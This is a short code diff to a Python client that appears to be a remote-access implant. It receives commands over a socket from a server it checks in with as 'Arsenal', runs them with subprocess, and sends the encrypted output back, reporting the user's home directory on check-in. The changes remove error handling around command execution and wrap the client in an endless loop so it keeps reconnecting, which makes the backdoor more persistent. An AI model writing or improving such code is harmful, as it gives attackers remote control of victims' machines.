@@ -35,10 +35,7 @@ def main():
             if 'cmd' in command:
                 del command[0]
                 print(command)
-                try:
-                    output = subprocess.run(command, stdout=subprocess.PIPE, stderr=stdout)
-                except:
-                    continue
+                output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                 sendit(s, output.stdout)
             elif 'Arsenal' in command:
                 sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
@@ -48,6 +45,7 @@ def main():
                 sendit(s, bytes(tmp))
         except socket.error as err:
             print("{0}\n".format(err))
+    return
 
 def sendit(s, output):
     message = do_encrypt(output)
@@ -57,4 +55,5 @@ def sendit(s, output):
     s.sendall(message)
 
 if __name__ == '__main__':
-    main()
+    while True:
+        main()
